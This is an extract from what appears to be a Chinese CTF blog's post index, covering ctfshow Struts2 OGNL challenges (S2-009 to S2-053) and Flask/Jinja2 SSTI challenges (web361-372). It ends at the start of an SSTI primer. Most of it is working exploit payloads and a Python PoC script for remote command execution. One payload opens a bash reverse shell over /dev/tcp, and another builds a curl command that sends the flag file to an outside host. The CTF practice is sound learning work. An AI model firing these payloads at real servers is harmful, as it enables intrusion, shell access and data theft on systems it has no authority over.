showcase远程代码执行漏洞)\n\n原理：\n\n这个漏洞再次来源于s2-003、s2-005\n\n参考Struts2漏洞分析之Ognl表达式特性引发的新思路，文中说到，该引入ognl的方法不光可能出现在这个漏洞中，也可能出现在其他java应用中\n\nStruts2对s2-003的修复方法是禁止静态方法调用，在s2-005中可直接通过OGNL绕过该限制，对于`#`号，同样使用编码`\\u0023`或`\\43`进行绕过；于是Struts2对s2-005的修复方法是禁止`\\`等特殊符号，使用户不能提交反斜线\n\n但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用`/helloword.acton?example=<OGNL statement>&(example)('xxx')=1`的方法来执行它，从而绕过官方对`#、\\`等特殊字符的防御\n\n通过Struts2框架中ParametersInterceptor拦截器只检查传入的参数名而不检查参数值的方式进行构造OGNL表达式从而造成代码执行\n\npayload: 来源于https://www.freebuf.com/articles/web/280245.html\n\n```plain\n/ajax/example5.action?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]\n```\n\n# WEB-284(S2-012)\n\n原理:\n\n如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 `${param_name}` 作为重定向变量\n\n比如:\n\n```plain\nxml\n<package name=\"S2-012\" extends=\"struts-default\">\n    <action name=\"user\" class=\"com.demo.action.UserAction\">\n        <result name=\"redirect\" type=\"redirect\">/index.jsp?name=${name}</result>\n        <result name=\"input\">/index.jsp</result>\n        <result name=\"success\">/index.jsp</result>\n    </action>\n</package>\n```\n\n这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。\n\npayload：\n\n```plain\n%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"cat\", \"/proc/self/environ\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}\n```\n\n# WEB-285(S2-013)\n\n原理：\n\nApache Struts2的s:a和s:url标签都提供了一个includeParams属性。此属性允许使用的值包括none、get、all。当该属性被设置为get或all时，Apache Struts2会将用户提交的参数值作为Ognl表达式执行。攻击者可以提交带有恶意的Ongl表达式，达到执行任意Java代码的目的。只要基于Apache Struts2开发的JSP代码中使用了url/a标签并且设置了includeParams属性为all或get，远程攻击者即可利用此漏执行任意命令。\n\npayload: 参考:https://www.anquanke.com/post/id/266386#h3-3\n\n```plain\nlink.action?fakeParam=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27env%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D\n```\n\n# WEB-286(S2-015)\n\n原理：\n\n在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。\n\n影响版本：\n\n- Struts2.3.5 – 2.3.31\n- Struts2.5 – 2.5.10\n\n你妈 说是S2-015的漏洞 但是poc要用S2-045才能打通\n\n而且用poc脚本打通S2-015里面没有flag\n\n脚本或者\n\npayload: 来源：[https://www.hacking8.com/bug-product/Struts2/Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.html](https://www.hacking8.com/bug-product/Struts2/Struts2-S2-045远程代码执行.html)\n\n```plain\n%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692955967130-30c47a51-06f3-4d81-8dfa-6b8dc8404498.png)\n\n# WEB-287(S2-016)\n\n原理：\n\n问题主要出在对于特殊URL处理中，redirect与redirectAction后面跟上Ognl表达式会被服务器执行\n\n在struts2中，DefaultActionMapper类支持以\"action:\"、“redirect:”、\"redirectAction:\"作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令\n\n所以，访问http://your-ip:8080/index.action?redirect:OGNL表达式即可执行OGNL表达式\n\npayload:\n\n```plain\n/default.action?redirect:${#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false,#f=#_memberAccess.getClass().getDeclaredField(\"allowStaticMethodAccess\"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(\"env\").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()}\n```\n\n需要注意的是提交的时候需要全字符编码\n\n# WEB-288(S2-019)\n\n原理：\n\n要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中\n\npayload: 来源:https://www.freebuf.com/vuls/246969.html\n\n```plain\n?debug=command&expression=#a=(new java.lang.ProcessBuilder('id')).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#out.getWriter().println(new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()\n```\n\n主要url全字符编码的时候一定要把里面的`&`别编码不然会混淆\n\n# WEB-289(S2-029)\n\n原理:\n\nStruts框架被强制执行时，对分配给某些标签的属性值进行双重评估，因此可以传入一个值，当一个标签的属性将被渲染时，该值将被再次评估\n\n例如：代码执行过程大致为先尝试获取value的值，如果value为空，那么就二次解释执行了name。并且在执行前给name加上了”%{}”。最终造成二次执行\n\n影响版本：Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外）\n\npayload：\n\n```plain\n/default.action?message=(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream()))\n```\n\n# WEB-290(S2-032)\n\n原理:\n\nStruts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用method:<name>的方式来调用名字是<name>的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞\n\n影响版本: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)\n\npayload：\n\n```plain\n?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=env\n```\n\n# WEB-291(S2-033)\n\n原理:\n\n当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行\n\n影响版本：Struts 2.3.20 – Struts 2.3.28 (不包括 2.3.20.3和 2.3.24.3)\n\npayload:\n\n```plain\n/orders/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=env\n```\n\n# WEB-292(S2-037)\n\n原理:\n\n当使用REST插件启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式\n\n影响版本：Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外）\n\npayload:\n\n```plain\n/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=whoami\n```\n\n# WEB-293(S2-045)\n\n原理:\n\n在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵\n\n恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令\n\n影响版本：Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10\n\npayload:\n\n```plain\nContent-Type: \"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\" boundary=----WebKitFormBoundaryXx80aU0pu6vrsV3z\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692960165492-0dc1a65d-933a-4280-9bbc-3ef12278f5d5.png)\n\n# WEB-294(S2-046)\n\n原理：\n\nS2-046漏洞和S2-045漏洞很相似，都是由于对Header某个字段信息处理发生异常，错误信息连带着payload同过buildErrorMessage函数带入LocalizedTextUtil.findText造成的。 但是不同的是，这次漏洞的触发点在Content-Length和Content-Disposition字段的filename中。\n\npayload:\n\n```plain\n#!/usr/bin/env python\n# encoding:utf-8\nimport requests\nclass Sugarcrm():\n    def poctest(self):   \n        boundary=\"---------------------------735323031399963166993862150\"\n        paylaod=\"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\"\n        url = 'http://200258f8-842d-4e4b-a894-ea043fd0d046.challenge.ctf.show/S2-046/doUpload.action'\n        headers = {'Content-Type': 'multipart/form-data; boundary='+boundary+''}\n        data =\"--\"+boundary+\"\\r\\nContent-Disposition: form-data; name=\\\"foo\\\"; filename=\\\"\"+paylaod+\"\\0b\\\"\\r\\nContent-Type: text/plain\\r\\n\\r\\nx\\r\\n--\"+boundary+\"--\"\n        rs=requests.post(url, headers=headers,data=data)\n        print(rs.text)\n\nif __name__ == '__main__':\n    test = Sugarcrm()\n    test.poctest()\n```\n\n不懂。。。\n\n# WEB-295(S2-048)\n\n又是showcase了\n\n原理:\n\n漏洞主要问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用就是将struts1的action封装成struts2的action以便它能在strut2上运行使用\n\n而由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同时这个 getText() 的 参数输入点，又可以被用户直接进行控制，如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击\n\n影响版本: 2.0.0 - 2.3.32\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692963120663-1045940c-f911-4e1d-af71-a1808e8f746d.png)\n\n成功执行\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692963158825-e4b7adae-128b-4bdf-b248-2c600091a40c.png)\n\npayload:\n\n```plain\n%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream())).(#q)}\n```\n\n注入点在第一个栏里\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692963566791-1536b3ed-3280-40e4-9a99-55dbe5916d98.png)\n\nflag就是这段 因为它报错不能解析我们的uuid\n\n# WEB-296(S2-052)\n\n这题直接用脚本poc打就行了 看好多师傅payload打不了\n\n# WEB-297(S2-053)\n\n原理:\n\nStruts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞\n\npayload：\n\n```plain\n%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i >& /dev/tcp/ip/port 0>&1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}\n```\n\n直接rce env找不到flag 反弹shell env才有flag 逆天\n\n# 后言\n\n也就当作是熟悉了 只是payload的搬运工:)\n","categories":["ctfshow"]},{"title":"ctfshow-ssti","url":"/post/7eb33f7a.html","content":"\nctfshow-ssti\n\n<!--more-->\n\n感觉这块网上直接找payload之外 没有真正理解答案 重新学习一下 顺便也要适应python了\n\n# WEB-361\n\n无过滤\n\npayload:`{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}`\n\n或者用lipsum包和cycler库\n\n```python\n?name={{lipsum.__globals__['os'].popen('tac ../flag').read()}}\n?name={{cycler.__init__.__globals__.os.popen('ls').read()}}\n```\n\n或者用控制块\n\n```python\n?name={% print(url_for.__globals__['__builtins__']['eval'](\"__import__('os').popen('cat ../flag').read()\"))%}\n```\n\n# WEB-362(过滤了os.wrap_close)\n\n用上一题的其他方式就行\n\n# WEB-363(过滤单双引号)\n\nget传参方式绕过或`request.cookies.x`都行\n\n需要注意的是`url_for.__builtins__`下没有os 但是可以用eval\n\n```python\n?name={{url_for.__globals__[request.args.a][request.args.b](request.args.c).read()}}&a=os&b=popen&c=cat /flag\n?name={{lipsum.__globals__.os.popen(request.args.ocean).read()}}&ocean =cat /flag\n?name={{url_for.__globals__[request.args.a][request.args.b](request.args.c)}}&a=__builtins__&b=eval&c=__import__('os').popen('cat /flag').read()\n```\n\n还有就是通过config配置信息截字符 截取到os\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692683423226-16a1cfbb-13c7-49d8-8421-d7d38b39e349.png)\n\n`?name={{url_for.__globals__[(config.__str__()[2])%2b(config.__str__()[42])]}}`这里需要注意就是`%2b`是 `+`的url编码 不加的话就会报错\n\n# WEB-364(过滤了args)\n\n\n\n也就是我们不能get传参了直接ban了 `request.args` 其实还可以用cookie\n\n```python\n?name={{url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()}}\ncookie 传参:a=os;b=popen;c=cat /flag\n```\n\n第二种：\n\nvalues可以获取所有参数 绕过args\n\n```\n?name={{lipsum.__globals__.os.popen(request.values.x).read()}}&x=cat /flag\n```\n\n# WEB-365(过滤了方括号)\n\n## payload_1\n\nvalues传参\n\nvalues 没有被过滤\n\n```\n?name={{lipsum.__globals__.os.popen(request.values.x).read()}}&x=cat /flag\n```\n\n或者cookie都行\n\n## payload_2\n\n字符串拼接\n\n`[]`可以用`.`或者`__getitem__`本质就是它\n\n其他师傅的脚本如下:\n\n```python\n# anthor:秀儿\nimport requests\nurl=\"http://bbb42674-c33e-4370-b602-c3318e79fa64.challenge.ctf.show/?name={{config.__str__().__getitem__(%d)}}\"\n\npayload=\"cat /flag\"\nresult=\"\"\nfor j in payload:\n    for i in range(0,1000):\n        r=requests.get(url=url%(i))\n        location=r.text.find(\"<h3>\")\n        word=r.text[location+4:location+5]\n        if word==j:\n            print(\"config.__str__().__getitem__(%d) == %s\"%(i,j))\n            result+=\"config.__str__().__getitem__(%d)~\"%(i)\n            break\nprint(result[:len(result)-1])\n```\n\n然后用`~`连接起来\n\n```python\n?name={{url_for.__globals__.os.popen(config.__str__().__getitem__(22)~config.__str__().__getitem__(40)~config.__str__().__getitem__(23)~config.__str__().__getitem__(7)~config.__str__().__getitem__(279)~config.__str__().__getitem__(4)~config.__str__().__getitem__(41)~config.__str__().__getitem__(40)~config.__str__().__getitem__(6)\n).read()}}\n```\n\n# WEB-366(过滤了下划线)\n\n可以用过滤器\n\n```python\n?name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}\ncookie:a=__globals__;b=cat /flag\n```\n\n# WEB-367(过滤了os)\n\n```python\n?name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}&a=__globals__&b=os&c=cat /flag\n```\n\n`lipsum.__globals__.get(os).popen(c=cat /flag)`最终构造是这个\n\n由于`[]`也是被waf了所以我们可以通过get(os)方式 之前我们都是`lipsum.__globals__['os']`\n\n也算是一个小trick\n\n# WEB-368(过滤了左花括号)\n\n用`{%print()%}`\n\n```python\n?name={%print((lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read())%}&a=__globals__&b=os&c=cat /flag\n```\n\n# WEB-369(过滤了request)\n\n## payload_1\n\n截取配置config构造 这类下划线被ban了 不能用`__str()__`\t所以就要用过滤器了\n\n获取字符串后本来要用`__getitem__`问题是`_`被ban了\n\n所以这里需要转换成list然后用`pop()`就可以得到我们想要的字符\n\n师傅们的payload:\n\n```python\n?name={% print (lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()\n)).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read() %}\n```\n\n可以来剖析一下\n\n总体是用`(config|string|list).pop(下标).lower()`这种方式去截取我们想要的字符\n\n然后转为小写 用`~`连接起来 这里还是存在那个trick 要用`get('os')`去代替`['os']`因为方括号被ban了\n\n## payload_2\n\n```python\n?name=\n{% set po=dict(po=a,p=a)|join%}\n{% set a=(()|select|string|list)|attr(po)(24)%}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}\n{%print(x.open(file).read())%}\n```\n\n解释\n\n```python\n构造po=\"pop\"     #利用dict()|join拼接得到\n{% set po=dict(po=a,p=a)|join%}  #po=pop\n \n等效于a=(()|select|string|list).pop(24),即a等价于下划线_\n{% set a=(()|select|string|list)|attr(po)(24)%} #a=_\n \n构造ini=\"___init__\"\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}#元组可以一层一层看好理解ini=__init__ 用了两个join\n \n构造glo=\"__globals__\"\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n \n构造geti=\"__getitem__\"\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n \n构造built=\"__builtins__\"\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n \n调用chr()函数  注意这里q取任何值都行 没有特别的意义\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}#x=q.__init__.globals__.__getitem__(__builtins__)\n{% set chr=x.chr%}#chr=q.__init__.globals__.__getitem__(__builtins__).chr \n \n构造file='/flag'\n{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}# %2b是+ 一定要有\n```\n\n# WEB-370(过滤数字)\n\n主要思路是就是用count过滤器搭配join计算字符长度获取数字 然后思路和上一题一样\n\npayload:\n\n```python\n{%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%}\n{%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%}\n{%set x=(()|select|string|list).pop(num)%}\n{%set glob = (x,x,dict(globals=a)|join,x,x)|join %}\n{%set builtins=x~x~(dict(builtins=a)|join)~x~x%}\n{%set c = dict(chr=a)|join%}\n{%set o = dict(o=a,s=a)|join%}\n{%set getitem = x~x~(dict(getitem=a)|join)~x~x%}\n{%set chr = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%}\n{%set file = chr(numm)~dict(flag=a)|join%}\n{%print((lipsum|attr(glob)|attr(getitem)(builtins)).open(file).read())%}\n```\n\n# WEB-371(过滤print无回显)\n\n```python\n/?name=\n{%set z=dict()|join|count%}\n{%set e=dict(a=a)|join|count%}\n{%set ee=dict(aa=a)|join|count%}\n{%set eee=dict(aaa=a)|join|count%}\n{%set eeee=dict(aaaa=a)|join|count%}\n{%set eeeee=dict(aaaaa=a)|join|count%}\n{%set eeeeee=dict(aaaaaa=a)|join|count%}\n{%set eeeeeee=dict(aaaaaaa=a)|join|count%}\n{%set eeeeeeee=dict(aaaaaaaa=a)|join|count%}\n{%set eeeeeeeee=dict(aaaaaaaaa=a)|join|count%}\n{%set eeeeeeeeee=dict(aaaaaaaaaa=a)|join|count%}\n{%set dayu=(()|select|string|list).pop()%}\n{% set space=(()|select|string|list).pop(eeeee*ee)%}\n{% set xhx=(()|select|string|list).pop(eee*eeeeeeeee) %}\n{% set point=(config|string|list).pop(eeeeeeeeee*ee*eeeeeeeeee-eeeeeeeee) %}\n{% set maohao=(config|string|list).pop(ee*eeeeeee) %}\n{% set xiegang=(config|string|list).pop(-eeeeeeee*eeeeeeee) %}\n{% set globals=(xhx,xhx,dict(globals=z)|join,xhx,xhx)|join %}\n{% set builtins=(xhx,xhx,dict(builtins=z)|join,xhx,xhx)|join %}\n{% set ohs=dict(o=z,s=z)|join %}\n{% set open=(lipsum|attr(globals)).get(builtins).open %}\n{% set result=open((xiegang,dict(flag=z)|join)|join).read() %}\n{% set curlcmd=(dict(curl=z)|join,space,dict(http=z)|join,maohao,xiegang,xiegang,eeeeeeee,point,e,eee,z,point,eee,eeee,point,eeeee,eee,maohao,eeeeeee,eeeeeee,eeeeeee,eeeeeee,xiegang,result)|join %}\n{% set shell=(lipsum|attr(globals)).get(ohs).popen(curlcmd) %}\n```\n\n先构造出数字0-9 然后去截取我们想要的符号 用curl外带flag\n\n构造出`curl http://ip:port/`\n\n一开始自己一直在构造bash反弹shell的 构造了老半天 md发现`-&`截取不到 没有这两个符号 太难过了 不过对过程有了更深的理解了\n\n# WEB-372(过滤了count)\n\n用length替换就行了 然后继续curl外带\n\n和上面payload差不多\n\n```python\n/?name=\n{%set z=dict()|join|length%}\n{%set e=dict(a=a)|join|length%}\n{%set ee=dict(aa=a)|join|length%}\n{%set eee=dict(aaa=a)|join|length%}\n{%set eeee=dict(aaaa=a)|join|length%}\n{%set eeeee=dict(aaaaa=a)|join|length%}\n{%set eeeeee=dict(aaaaaa=a)|join|length%}\n{%set eeeeeee=dict(aaaaaaa=a)|join|length%}\n{%set eeeeeeee=dict(aaaaaaaa=a)|join|length%}\n{%set eeeeeeeee=dict(aaaaaaaaa=a)|join|length%}\n{%set eeeeeeeeee=dict(aaaaaaaaaa=a)|join|length%}\n{%set dayu=(()|select|string|list).pop()%}\n{% set space=(()|select|string|list).pop(eeeee*ee)%}\n{% set xhx=(()|select|string|list).pop(eee*eeeeeeeee) %}\n{% set point=(config|string|list).pop(eeeeeeeeee*ee*eeeeeeeeee-eeeeeeeee) %}\n{% set maohao=(config|string|list).pop(ee*eeeeeee) %}\n{% set xiegang=(config|string|list).pop(-eeeeeeee*eeeeeeee) %}\n{% set globals=(xhx,xhx,dict(globals=z)|join,xhx,xhx)|join %}\n{% set builtins=(xhx,xhx,dict(builtins=z)|join,xhx,xhx)|join %}\n{% set ohs=dict(o=z,s=z)|join %}\n{% set open=(lipsum|attr(globals)).get(builtins).open %}\n{% set result=open((xiegang,dict(flag=z)|join)|join).read() %}\n{% set curlcmd=(dict(curl=z)|join,space,dict(http=z)|join,maohao,xiegang,xiegang,eeeeeeee,point,e,eee,z,point,eee,eeee,point,eeeee,eee,maohao,eeeeeee,eeeeeee,eeeeeee,eeeeeee,xiegang,result)|join %}\n{% set shell=(lipsum|attr(globals)).get(ohs).popen(curlcmd) %}\n```\n\n成功\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692699535461-6fe5aca5-bfd2-406e-aef9-9ec52ed5e842.png)\n\n# 后言 \n\n虽然这是一个老生常谈的题目 但是自己对payload不太理解 这次刷过之后 会好很多 不至于看不懂 冲就完了\n","categories":["ctfshow"]},{"title":"Flask SSTI简单学习","url":"/post/c52c3ed.html","content":"\nFlask SSTI\n\n<!--more-->\n\n# SSTI前置知识\n\n```python\n{%%}可以用来声明变量，当然也可以用于循环语句和条件语句。\n{{}}用于将表达式打印到模板输出\n{##}表示未包含在模板输出中的注释\n##可以有和{%%}相同的效果\n```\n\n了解一些python的魔术方法和内置类\n\n## __class__\n\n返回该对象所属的类 \n\n```python\n>>>''.__class__ #''里面是字符串类型\n<class 'str'>\n>>>().__class__\n<class 'tuple'> #()里面是元组类型\n```\n\n## 